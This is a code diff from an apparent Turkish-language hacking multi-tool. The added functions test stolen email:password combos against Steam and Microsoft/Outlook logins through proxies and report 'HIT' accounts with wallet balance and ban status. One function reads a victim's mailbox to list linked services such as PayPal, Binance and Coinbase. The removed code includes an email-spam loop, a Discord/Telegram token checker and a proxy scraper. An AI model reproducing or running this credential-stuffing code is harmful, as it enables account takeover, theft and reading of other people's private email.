+            return {"status": "BAD", "message": "SteamID alınamadı"}
+
+        guard_types = [c.get("confirmation_type", 0) for c in resp.get("allowed_confirmations", [])]
+        if any(t in (3, 4) for t in guard_types):
+            return {"status": "2FA", "message": "Steam Guard gerekli"}
+
+        time.sleep(0.5)
+        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
+            data={"client_id": resp["client_id"], "request_id": resp["request_id"]}, timeout=10).json().get("response", {})
+
+        access, refresh = poll.get("access_token"), poll.get("refresh_token")
+        if not access or not refresh:
+            return {"status": "BAD", "message": "Token alınamadı"}
+
+        session.get("https://store.steampowered.com/", timeout=8)
+        sid = session.cookies.get("sessionid", "")
+        try:
+            fin = session.post("https://login.steampowered.com/jwt/finalizelogin", data={"nonce": refresh, "sessionid": sid, "redir": "https://steamcommunity.com/login/home/?goto="}, timeout=8)
+            for t in fin.json().get("transfer_info", []):
+                if t.get("url"):
+                    session.post(t["url"], data=t.get("params", {}), timeout=8)
         except:
             pass
 
-    def create_temp_mail_view(self):
-        view = QWidget()
-        layout = QVBoxLayout(view)
-        layout.setContentsMargins(40, 20, 40, 40)
-        lbl = QLabel("Geçici E-Posta İstasyonu")
-        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
-        layout.addWidget(lbl)
-        layout.addSpacing(15)
-        top_h = QHBoxLayout()
-        self.mail_input = QLineEdit()
-        self.mail_input.setReadOnly(True)
-        self.mail_input.setText("Adres Üretilmedi")
-        btn_copy = QPushButton("Kopyala")
-        self.apply_btn_style(btn_copy, "#3b82f6", "#2563eb")
-        btn_copy.clicked.connect(self.tm_copy)
-        btn_gen = QPushButton("Adres Üret")
-        self.apply_btn_style(btn_gen, "#bc13fe", "#a811e3")
-        btn_gen.clicked.connect(self.tm_generate)
-        top_h.addWidget(self.mail_input, stretch=1)
-        top_h.addWidget(btn_copy)
-        top_h.addWidget(btn_gen)
-        layout.addLayout(top_h)
-        
-        self.tm_stack = QStackedWidget()
-        page_list = QWidget()
-        lay_list = QVBoxLayout(page_list)
-        lay_list.setContentsMargins(0, 10, 0, 0)
-        btn_ref = QPushButton("Gelen Kutusunu Yenile")
-        self.apply_btn_style(btn_ref, "#10b981", "#059669")
-        btn_ref.clicked.connect(self.tm_refresh)
-        self.inbox_list = QListWidget()
-        self.inbox_list.itemClicked.connect(self.tm_read_mail)
-        lay_list.addWidget(btn_ref)
-        lay_list.addWidget(self.inbox_list)
-        self.tm_stack.addWidget(page_list)
-        
-        page_read = QWidget()
-        lay_read = QVBoxLayout(page_read)
-        lay_read.setContentsMargins(0, 10, 0, 0)
-        btn_back = QPushButton("Listeye Geri Dön")
-        self.apply_btn_style(btn_back, "#64748b", "#475569")
-        btn_back.clicked.connect(lambda: self.tm_stack.setCurrentIndex(0))
-        self.mail_content = QTextBrowser()
-        self.mail_content.setOpenExternalLinks(True)
-        lay_read.addWidget(btn_back)
-        lay_read.addWidget(self.mail_content)
-        self.tm_stack.addWidget(page_read)
-        layout.addWidget(self.tm_stack, stretch=1)
-        self.temp_mail = ""
-        self.temp_token = ""
-        return view
+        if "steamLoginSecure" not in [c.name for c in session.cookies]:
+            for d in [".steamcommunity.com", ".steampowered.com"]:
+                session.cookies.set("steamLoginSecure", f"{steamid}||{access}", domain=d)
 
-    def tm_generate(self):
-        self.mail_input.setText("Üretiliyor...")
-        self.gen_w = MailTmGenerateWorker()
-        self.gen_w.success_signal.connect(self.tm_gen_ok)
-        self.gen_w.start()
+        # Level
+        level = "?"
+        try:
+            r = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access, "steamid": steamid}, timeout=8)
+            if r.status_code == 200 and r.json().get("response"):
+                level = str(r.json()["response"].get("player_level", "?"))
+        except:
+            pass
 
-    def tm_gen_ok(self, email, pwd, token):
-        self.temp_mail = email
-        self.temp_token = token
-        self.mail_input.setText(email)
-        self.inbox_list.clear()
-        RodaToastNotification("Sistem", "Yeni E-Posta oluşturuldu.", self.canvas)
+        # Wallet
+        balance = "—"
+        try:
+            r = session.get("https://store.steampowered.com/account/", timeout=8)
+            if r.status_code == 200:
+                m = re.search(r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r.text)
+                if m:
+                    balance = m.group(1).strip()
+        except:
+            pass
 
-    def tm_copy(self):
-        if self.temp_mail:
-            QApplication.clipboard().setText(self.temp_mail)
-            RodaToastNotification("Pano", "E-Posta kopyalandı.", self.canvas)
+        # VAC
+        vac_banned = False
+        vac_count = 0
+        vac_days = 0
+        try:
+            r = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", params={"access_token": access, "steamids": steamid}, timeout=8)
+            if r.status_code == 200 and r.json().get("players"):
+                p = r.json()["players"][0]
+                vac_banned = bool(p.get("VACBanned", False))
+                vac_count = int(p.get("NumberOfVACBans", 0))
+                vac_days = int(p.get("DaysSinceLastBan", 0))
+        except:
+            pass
+        vac_str = f"🔴VAC({vac_count}ban,{vac_days}g önce)" if vac_banned else "🟢Temiz"
 
-    def tm_refresh(self):
-        if not self.temp_token:
-            return
-        self.inbox_list.clear()
-        self.inbox_list.addItem("Taranıyor...")
-        self.ref_w = MailTmRefreshWorker(self.temp_token)
-        self.ref_w.success_signal.connect(self.tm_ref_ok)
-        self.ref_w.start()
+        return {
+            "status": "HIT",
+            "message": f"Steam giriş başarılı",
+            "details": {
+                "level": level,
+                "balance": balance,
+                "vac": vac_str,
+                "steamid": steamid
+            }
+        }
 
-    def tm_ref_ok(self, msgs):
-        self.inbox_list.clear()
-        if not msgs:
-            self.inbox_list.addItem("Kutu boş.")
-            return
-        for msg in msgs:
-            item = QListWidgetItem(f"Gönderen: {msg.get('from', {}).get('address', '')} | Konu: {msg.get('subject', '')}")
-            item.setData(Qt.ItemDataRole.UserRole, msg.get("id"))
-            self.inbox_list.addItem(item)
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
 
-    def tm_read_mail(self, item):
-        msg_id = item.data(Qt.ItemDataRole.UserRole)
-        if not msg_id:
-            return
-        self.mail_content.setText("İçerik yükleniyor...")
-        self.tm_stack.setCurrentIndex(1)
-        self.rd_w = MailTmReadWorker(self.temp_token, msg_id)
-        self.rd_w.success_signal.connect(self.tm_read_ok)
-        self.rd_w.start()
+# ---- SUPERCELL CHECKER ----
+def check_supercell_account(email, password, proxy_url=None):
+    session = requests.Session()
+    if proxy_url:
+        session.proxies = {"http": proxy_url, "https": proxy_url}
 
-    def tm_read_ok(self, msg):
-        raw_text = msg.get('text', '')
-        html_text = re.sub(r'(https?://\S+)', r'<a href="\1" style="color: #bc13fe;">\1</a>', raw_text.replace('\n', '<br>'))
-        formatted_html = f"<b>Kimden:</b> {msg.get('from', {}).get('address', '')}<br><b>Konu:</b> {msg.get('subject')}<br><br><b>İçerik:</b><br>{html_text}"
-        self.mail_content.setHtml(formatted_html)
+    ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+    redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
 
-    def create_spammer_view(self):
-        view = QWidget()
-        layout = QVBoxLayout(view)
-        layout.setContentsMargins(40, 20, 40, 40)
-        lbl = QLabel("Email Paket Gönderimi")
-        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
-        layout.addWidget(lbl)
-        layout.addSpacing(20)
-        top_h = QHBoxLayout()
-        self.spam_input = QLineEdit()
-        self.spam_input.setPlaceholderText("Hedef e-posta adresini girin...")
-        self.spam_speed = QComboBox()
-        self.spam_speed.addItems(["Hız Modu: Yavas (5 sn)", "Hız Modu: Hizli (1 sn)"])
-        top_h.addWidget(self.spam_input, stretch=1)
-        top_h.addWidget(self.spam_speed)
-        layout.addLayout(top_h)
-        self.btn_spam = QPushButton("Döngüyü Başlat")
-        self.apply_btn_style(self.btn_spam, "#ef4444", "#dc2626")
-        self.btn_spam.clicked.connect(self.toggle_spam)
-        layout.addWidget(self.btn_spam)
-        self.spam_log = QTextEdit()
-        self.spam_log.setReadOnly(True)
-        layout.addWidget(self.spam_log, stretch=1)
-        return view
+    try:
+        url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id={client_id}&mkt=en&response_type=code&redirect_uri={quote(redirect_uri)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
+        headers = {"User-Agent": ua}
 
-    def toggle_spam(self):
-        if "spam" in self.aktif_calisanlar:
-            self.aktif_calisanlar["spam"].stop()
-            del self.aktif_calisanlar["spam"]
-            self.btn_spam.setText("Döngüyü Başlat")
-            self.apply_btn_style(self.btn_spam, "#ef4444", "#dc2626")
+        r1 = session.get(url_auth, headers=headers, allow_redirects=False, timeout=15)
+        if r1.status_code != 302:
+            return {"status": "ERROR", "message": f"Ağ Hatası (R1)"}
+
+        next_url = r1.headers.get('Location', '')
+        r2 = session.get(next_url, headers=headers, allow_redirects=False, timeout=15)
+
+        ppft_match = re.search(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"', r2.text) or re.search(r'name="PPFT".*?value="([^"]*)"', r2.text)
+        ppft = ppft_match.group(1) if ppft_match else None
+        url_post = re.search(r'"urlPost":"(.*?)"', r2.text) or re.search(r"urlPost:'(.*?)'", r2.text)
+        url_post = url_post.group(1) if url_post else None
+
+        if not ppft or not url_post:
+            return {"status": "ERROR", "message": "PPFT veya URL alınamadı"}
+
+        data_login = {
+            "i13": "1", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "1",
+            "passwd": password, "ps": "2", "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
+        }
+        headers_post = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}
+        r3 = session.post(url_post, data=data_login, headers=headers_post, allow_redirects=False, timeout=15)
+
+        if "incorrect" in r3.text.lower() or "password" in r3.text.lower() and "error" in r3.text.lower():
+            return {"status": "BAD", "message": "Yanlış şifre"}
+
+        oauth_url = ""
+        if r3.status_code == 302 and "Location" in r3.headers:
+            oauth_url = r3.headers['Location']
         else:
-            if not self.spam_input.text().strip():
-                return
-            w = EmailSpamWorker(self.spam_input.text().strip(), self.spam_speed.currentText())
-            w.log_signal.connect(self.spam_log.append)
-            self.aktif_calisanlar["spam"] = w
-            w.start()
-            self.btn_spam.setText("Döngüyü Kapat")
-            self.apply_btn_style(self.btn_spam, "#64748b", "#475569")
+            uaid = re.search(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"', r3.text) or re.search(r'name="uaid" id="uaid" value="(.*?)"', r3.text)
+            uaid = uaid.group(1) if uaid else None
+            opid = re.search(r'opid%3d(.*?)%26', r3.text)
+            opid = opid.group(1) if opid else None
+            opidt = re.search(r'opidt%3d(.*?)&', r3.text)
+            opidt = opidt.group(1) if opidt else None
 
-    def create_token_view(self):
-        view = QWidget()
-        layout = QVBoxLayout(view)
-        layout.setContentsMargins(40, 20, 40, 40)
-        lbl = QLabel("Siber Token Denetimi")
-        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
-        layout.addWidget(lbl)
-        layout.addSpacing(20)
-        sel_layout = QHBoxLayout()
-        self.t_type = "discord"
-        self.btn_dc = QPushButton("Discord")
-        self.btn_tg = QPushButton("Telegram")
-        self.token_input = QLineEdit()
-        def update_token_ui(t):
-            self.t_type = t
-            if t == "discord":
-                self.apply_btn_style(self.btn_dc, "#5865F2", "#4752C4")
-                self.apply_btn_style(self.btn_tg, "#64748b", "#475569")
+            if uaid and opid:
+                oauth_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id={client_id}&opid={opid}&mkt=EN-US&opidt={opidt}&res=success&route=C105_BAY"
             else:
-                self.apply_btn_style(self.btn_dc, "#64748b", "#475569")
-                self.apply_btn_style(self.btn_tg, "#0088cc", "#0077b5")
-            self.token_input.setPlaceholderText(f"{t.capitalize()} Token Girin...")
-        self.btn_dc.clicked.connect(lambda: update_token_ui("discord"))
-        self.btn_tg.clicked.connect(lambda: update_token_ui("telegram"))
-        update_token_ui("discord")
-        sel_layout.addWidget(self.btn_dc)
-        sel_layout.addWidget(self.btn_tg)
-        layout.addLayout(sel_layout)
-        layout.addWidget(self.token_input)
-        btn_chk = QPushButton("Tokeni Doğrula")
-        self.apply_btn_style(btn_chk, "#bc13fe", "#a811e3")
-        btn_chk.clicked.connect(self.check_token_action)
-        layout.addWidget(btn_chk)
-        self.token_log = QTextEdit()
-        self.token_log.setReadOnly(True)
-        layout.addWidget(self.token_log, stretch=1)
-        return view
+                return {"status": "2FA", "message": "Doğrulama istiyor"}
 
-    def check_token_action(self):
-        t = self.token_input.text().strip()
-        if not t:
-            return
-        self.token_log.append(f"\nSorgulanıyor [{self.t_type.upper()}]...")
-        self.checker_w = TokenCheckWorker(self.t_type, t)
-        self.checker_w.result_signal.connect(lambda s, m: self.token_log.append(f"-> Sonuç:\n{m}"))
-        self.checker_w.start()
-
-    def create_proxy_view(self):
-        view = QWidget()
-        layout = QVBoxLayout(view)
-        layout.setContentsMargins(40, 20, 40, 40)
-        lbl = QLabel("Proxy Kazıma & Denetleme")
-        lbl.setStyleSheet("color: #ffffff; font-size: 26px; font-weight: 800;")
-        layout.addWidget(lbl)
-        
-        ctrl = QHBoxLayout()
-        self.p_limit = QComboBox()
-        self.p_limit.addItems([f"Hedef Çalışan Limit: {i}" for i in [5, 10, 15, 50]])
-        self.p_proto = QComboBox()
-        self.p_proto.addItems(["Protokol: http", "Protokol: socks4", "Protokol: socks5", "Protokol: all"])
-        self.p_country = QComboBox()
-        self.p_country.addItems(["Ülke: TR", "Ülke: US", "Ülke: DE", "Ülke: GB", "Ülke: FR"])
-        
-        for c in [self.p_limit, self.p_proto, self.p_country]:
-            ctrl.addWidget(c)
-        
-        self.p_btn = QPushButton("Scrape & Check Başlat")
-        self.apply_btn_style(self.p_btn, "#bc13fe", "#a811e3")
-        self.p_btn.clicked.connect(self.start_proxy)
-        ctrl.addWidget(self.p_btn)
-        layout.addLayout(ctrl)
-        
-        self.p_prog = QLabel("Bekliyor...")
-        self.p_prog.setStyleSheet("color: #10b981; font-weight: bold;")
-        layout.addWidget(self.p_prog)
-        
-        self.p_log = QListWidget()
-        layout.addWidget(self.p_log, stretch=1)
-        self.p_worker = None
-        return view
-
-    def start_proxy(self):
-        if self.p_worker and self.p_worker.isRunning():
-            self.p_worker.stop()
-            self.p_btn.setText("Başlat")
-            self.apply_btn_style(self.p_btn, "#bc13fe", "#a811e3")
+        code = None
+        if oauth_url.startswith("msauth://"):
+            code = re.search(r'code=(.*?)&', oauth_url)
+            code = code.group(1) if code else None
         else:
-            self.p_log.clear()
-            limit = int(self.p_limit.currentText().split(": ")[1])
-            proto = self.p_proto.currentText().split(": ")[1]
-            country = self.p_country.currentText().split(": ")[1]
-            self.p_worker = ProxyWorker(limit, country, proto)
-            self.p_worker.log_signal.connect(lambda s, m: self.p_log.addItem(f"[{s}] {m}"))
-            self.p_worker.progress_signal.connect(lambda c, w, t: self.p_prog.setText(f"Taranan: {c} | Çalışan: {w} / Hedef: {t}"))
-            self.p_worker.finished_signal.connect(lambda: [self.p_btn.setText("Başlat"), self.apply_btn_style(self.p_btn, "#bc13fe", "#a811e3")])
-            self.p_worker.start()
-            self.p_btn.setText("Durdur")
-            self.apply_btn_style(self.p_btn, "#ef4444", "#dc2626")
+            r4 = session.get(oauth_url, allow_redirects=False, timeout=15)
+            loc = r4.headers.get('Location', '')
+            code = re.search(r'code=(.*?)&', loc)
+            code = code.group(1) if code else None
 
-    def create_tiktok_view(self):
-        desc = ("Bu araç rastgele TikTok kullanıcı adları üretir.\n"
-                "NOT: TikTok Cloudflare koruması uyguladığından %100 doğruluk veremez.")
-        statuses = {"HİT": "#10b981", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
-        return UniversalCheckerWidget("TikTok Oto-Oluşturucu", desc, TiktokWorker, statuses, needs_combo=False)
+        if not code:
+            return {"status": "2FA", "message": "Code alınamadı (2FA olabilir)"}
 
-    def create_xbox_view(self):
-        desc = "Xbox / Minecraft (Gamepass) yetkilerini denetler. Güvenli API kullanır."
-        statuses = {"HİT": "#10b981", "2FA": "#eab308", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
-        return UniversalCheckerWidget("Xbox & MC Checker", desc, XboxWorker, statuses, needs_combo=True)
+        data_token = {
+            "client_info": "1", "client_id": client_id, "redirect_uri": redirect_uri,
+            "grant_type": "authorization_code", "code": code,
+            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+        }
+        r5 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data_token, timeout=15)
 
-    def create_wolfteam_view(self):
-        desc = "Joygame / Wolfteam hesaplarını tarar. Arkaplanda Flask Turnstile Sunucusunun çalışması GEREKLİDİR."
-        statuses = {"HİT": "#10b981", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
-        return UniversalCheckerWidget("Wolfteam Checker", desc, WolfteamWorker, statuses, needs_combo=True)
+        if r5.status_code == 200:
+            token = r5.json().get('access_token')
+            cid = session.cookies.get("MSPCID", domain=".login.live.com") or "0000000000000000"
 
-    def create_craftrise_view(self):
-        desc = "Craftrise rank ve RC bakiyesi tarar. Arkaplanda Flask Turnstile Sunucusunun çalışması GEREKLİDİR."
-        statuses = {"HİT": "#10b981", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
-        return UniversalCheckerWidget("Craftrise Checker", desc, CraftriseWorker, statuses, needs_combo=True)
+            url_search = "https://outlook.live.com/search/api/v2/query?n=124"
+            payload = {
+                "Cvid": str(uuid.uuid4()),
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "UTC",
+                "EntityRequests": [{
+                    "EntityType": "Message",
+                    "ContentSources": ["Exchange"],
+                    "Query": {"QueryString": "Supercell ID"},
+                    "Size": 50,
+                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+                }]
+            }
+            headers_search = {
+                "Authorization": f"Bearer {token}",
+                "X-AnchorMailbox": f"CID:{cid}",
+                "Content-Type": "application/json",
+                "User-Agent": "Outlook-Android/2.0"
+            }
 
-    def create_hotmail_view(self):
-        desc = "Outlook/Hotmail hesaplarını güvenli MS Server üzerinden test eder. 2FA'ya düşenleri ayırır."
-        statuses = {"HİT": "#10b981", "2FA": "#eab308", "BAD": "#ef4444", "CUSTOM": "#3b82f6"}
-        return UniversalCheckerWidget("Hotmail Checker", desc, HotmailWorker, statuses, needs_combo=True)
+            r_search = session.post(url_search, json=payload, headers=headers_search, timeout=15)
+            if r_search.status_code == 200:
+                data = r_search.json()
+                try:
+                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
+                except:
+                    results = []
 
-    # ========== PENCERE SÜRÜKLEME ==========
-    def mousePressEvent(self, event):
-        if event.button() == Qt.MouseButton.LeftButton:
-            self.drag_offset = event.globalPosition().toPoint() - self.frameGeometry().topLeft()
-            event.accept()
+                total_found = len(results)
+                games = {
+                    "Clash Royale": "❌",
+                    "Brawl Stars": "❌",
+                    "Clash Of Clans": "❌",
+                    "Hay Day": "❌"
+                }
 
-    def mouseMoveEvent(self, event):
-        if event.buttons() == Qt.MouseButton.LeftButton:
-            self.move(event.globalPosition().toPoint() - self.drag_offset)
-            event.accept()
+                if total_found > 0:
+                    for item in results:
+                        source = item.get('Source', {})
+                        content = ((source.get('Subject') or "") + " " + (source.get('Preview') or "")).lower()
+                        if "clash royale" in content:
+                            games["Clash Royale"] = "✔️"
+                        if "brawl stars" in content:
+                            games["Brawl Stars"] = "✔️"
+                        if "clash of clans" in content:
+                            games["Clash Of Clans"] = "✔️"
+                        if "hay day" in content:
+                            games["Hay Day"] = "✔️"
 
-if __name__ == "__main__":
-    QApplication.setHighDpiScaleFactorRoundingPolicy(Qt.HighDpiScaleFactorRoundingPolicy.PassThrough)
-    app = QApplication(sys.argv)
-    app.setStyle('Fusion')
-    engine = RodaEngine()
-    engine.show()
-    sys.exit(app.exec())
+                    return {
+                        "status": "HIT",
+                        "message": f"Supercell bağlantıları bulundu",
+                        "details": {
+                            "email": email,
+                            "games": games,
+                            "total_found": total_found
+                        }
+                    }
+                else:
+                    return {
+                        "status": "FREE",
+                        "message": "Supercell maili bulunamadı",
+                        "details": {
+                            "email": email,
+                            "games": games,
+                            "total_found": 0
+                        }
+                    }
+            else:
+                return {"status": "ERROR", "message": "Arama API hatası"}
+        else:
+            return {"status": "ERROR", "message": "Token hatası"}
+
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
+
+# ---- RODA INBOX (580+ SERVİS) ----
+RODA_SERVICES = {
+    'security@facebookmail.com': 'Facebook',
+    'security@mail.instagram.com': 'Instagram',
+    'register@account.tiktok.com': 'TikTok',
+    'info@x.com': 'Twitter',
+    'noreply@discord.com': 'Discord',
+    'noreply@steampowered.com': 'Steam',
+    'noreply@xbox.com': 'Xbox',
+    'reply@txn-email.playstation.com': 'PlayStation',
+    'help@acct.epicgames.com': 'EpicGames',
+    'no-reply@riotgames.com': 'Riot Games',
+    'noreply@valorant.com': 'Valorant',
+    'noreply@mojang.com': 'Minecraft',
+    'accounts@roblox.com': 'Roblox',
+    'info@account.netflix.com': 'Netflix',
+    'no-reply@spotify.com': 'Spotify',
+    'no-reply@twitch.tv': 'Twitch',
+    'no-reply@youtube.com': 'YouTube',
+    'no-reply@disneyplus.com': 'Disney+',
+    'info@Tabii.com': 'Tabii',
+    'account-update@amazon.com': 'Amazon',
+    'no-reply@aliexpress.com': 'AliExpress',
+    'noreply@trendyol.com': 'Trendyol',
+    'service@paypal.com.br': 'PayPal',
+    'do-not-reply@ses.binance.com': 'Binance',
+    'no-reply@coinbase.com': 'Coinbase',
+    'no-reply@ubereats.com': 'Uber Eats',
+    'no-reply@yemeksepeti.com': 'Yemek Sepeti',
+    'noreply@getir.com': 'Getir',
+    'no-reply@uber.com': 'Uber',
+    'no-reply@airbnb.com': 'Airbnb',
+    'no-reply@booking.com': 'Booking.com',
+    'no-reply@accounts.google.com': 'Google',
+    'noreply@github.com': 'GitHub',
+    'no-reply@zoom.us': 'Zoom',
+    'noreply@openai.com': 'ChatGPT/OpenAI',
+    'noreply@coursera.org': 'Coursera',
+    'noreply@udemy.com': 'Udemy',
+    'noreply@nytimes.com': 'NYTimes',
+    'noreply@bbc.com': 'BBC',
+    'noreply@chess.com': 'Chess.com',
+    'no-reply@nordvpn.com': 'NordVPN',
+}
+
+def check_roda_inbox(email, password, proxy_url=None):
+    session = requests.Session()
+    if proxy_url:
+        session.proxies = {"http": proxy_url, "https": proxy_url}
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+    try:
+        r1 = session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", timeout=15)
+        if "MSAccount" not in r1.text:
+            return {"status": "BAD", "message": "MSAccount yok"}
+
+        r2 = session.get(
+            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
+            timeout=15, allow_redirects=True
+        )
+        if r2.status_code != 200:
+            return {"status": "BAD", "message": f"OAuth {r2.status_code}"}
+
+        m_ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r2.text) or re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
+        m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
+        if not m_ppft or not m_url:
+            return {"status": "BAD", "message": "PPFT bulunamadı"}
+        ppft = m_ppft.group(1)
+        post_url = m_url.group(1).replace("\\/", "/")
+
+        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}"
+        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
+        if r3.status_code in (302, 303):
+            loc = r3.headers.get("Location", "")
+            if "SIGNIN" in loc or "login" in loc:
+                return {"status": "BAD", "message": "Şifre hatalı veya 2FA"}
+        if "identity/confirm" in r3.text:
+            return {"status": "2FA", "message": "2FA gerekli"}
+        if "account or password is incorrect" in r3.text or "Abuse" in r3.text:
+            return {"status": "BAD", "message": "Hatalı giriş"}
+
+        location = r3.headers.get("Location", "")
+        if not location:
+            m_code = re.search(r'code=([^&"\']+)', r3.text)
+            if not m_code:
+                return {"status": "BAD", "message": "Code yok"}
+            code = m_code.group(1)
+        else:
+            m_code = re.search(r"code=([^&]+)", location)
+            if not m_code:
+                return {"status": "BAD", "message": "Location'da code yok"}
+            code = m_code.group(1)
+
+        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
+            data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",
+            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15
+        )
+        if r4.status_code != 200:
+            return {"status": "ERROR", "message": "Token hatası"}
+        token_data = r4.json()
+        if "access_token" not in token_data:
+            return {"status": "ERROR", "message": "access_token yok"}
+        token = token_data["access_token"]
+
+        cid = session.cookies.get("MSPCID", str(uuid.uuid4()).replace("-", "").upper())
+        headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}
+
+        country = ""
+        try:
+            r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
+            if r5.status_code == 200:
+                p = r5.json()
+                for acc in p.get("accounts", []):
+                    loc = acc.get("location", "")
+                    if loc:
+                        country = str(loc).strip()
+                        break
+        except:
+            pass
+
+        inbox_text = ""
+        try:
+            r6 = session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", data="", headers={**headers, "content-length": "0"}, timeout=30)
+            inbox_text = r6.text.lower()
+        except:
+            pass
+
+        try:
+            r7 = session.get("https://outlook.office365.com/api/v2.0/me/messages?$top=150&$select=From,Subject,BodyPreview", headers=headers, timeout=25)
+            if r7.status_code == 200:
+                data = r7.json()
+                for msg in data.get("value", []):
+                    from_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address", "").lower()
+                    subject = msg.get("Subject", "").lower()
+                    body = msg.get("BodyPreview", "").lower()
+                    inbox_text += f" {from_addr} {subject} {body}"
+        except:
+            pass
+
+        services_found = []
+        unique = set()
+        for sender, svc in RODA_SERVICES.items():
+            if svc in unique:
+                continue
+            if sender.lower() in inbox_text or svc.lower() in inbox_text:
+                services_found.append(svc)
+                unique.add(svc)
+
+        if services_found:
+            status = "HIT"
+        else:
+            status = "VALID"
+
+        return {
+            "status": status,
+            "message": "Roda Inbox taraması tamamlandı",
+            "details": {
+                "email": email,
+                "country": country.upper()[:2] if country else "?",
+                "services_found": services_found,
+                "services_count": len(services_found),
+            }
+        }
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
+
+# ============================================================
+# KATEGORİZASYON / EXTRACT / PROXY / SCANNER
+# ============================================================
+def categorize_endpoint(endpoint):
+    ep = endpoint.lower()
+    if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport']):
+        return 'Auth'
+    elif any(x in ep for x in ['admin', 'panel', 'dashboard', 'manage', 'system', 'mod']):
+        return 'Admin'
+    elif any(x in ep for x in ['user', 'profile', 'account', 'me', 'preferences', 'settings', 'my']):
+        return 'User'
+    elif any(x in ep for x in ['health', 'ping', 'status', 'check', 'heartbeat', 'live']):
+        return 'Health'
+    elif any(x in ep for x in ['api', 'v1', 'v2', 'v3', 'v4', 'rest', 'graphql', 'rpc']):
+        return 'API'
+    else:
+        return 'Genel'
+
+def extract_from_html(html, base_url):
+    endpoints = set()
+    for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
+        endpoints.add(m.group(1))
+    for m in re.finditer(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I):
+        href = m.group(1)
+        if href.startswith('/') or 'api' in href or 'rest' in href or 'graphql' in href:
+            endpoints.add(href)
+    for m in re.finditer(r'src\s*=\s*["\']([^"\']+\.js)["\']', html, re.I):
+        endpoints.add(m.group(1))
+    for m in re.finditer(r'(?:fetch|axios|\.get|\.post|\.ajax)\s*\(\s*["\']([^"\']+)["\']', html, re.I):
+        endpoints.add(m.group(1))
+    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
+
+def extract_from_js(js, base_url):
+    endpoints = set()
+    patterns = [
+        r'fetch\s*\(\s*["\']([^"\']+)["\']',
+        r'axios\.(?:get|post|put|delete|patch|request)\s*\(\s*["\']([^"\']+)["\']',
+        r'\.ajax\s*\(\s*\{\s*url\s*:\s*["\']([^"\']+)["\']',
+        r'xhr\.open\s*\(\s*["\']\w+["\']\s*,\s*["\']([^"\']+)["\']',
+        r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']',
+        r'EventSource\s*\(\s*["\']([^"\']+)["\']',
